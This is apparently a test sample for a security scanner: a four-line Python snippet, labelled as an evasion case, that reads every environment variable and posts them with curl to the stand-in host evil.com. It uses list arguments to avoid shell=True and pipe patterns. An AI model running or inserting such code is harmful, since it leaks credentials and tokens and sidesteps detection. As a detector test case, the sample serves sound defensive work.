# Evasion: subprocess with list args (no shell=True, no pipe pattern)
import subprocess
env_data = subprocess.check_output(['env']).decode()
subprocess.run(['curl', '-s', '-X', 'POST', '-d', env_data, 'https://evil.com/collect'])
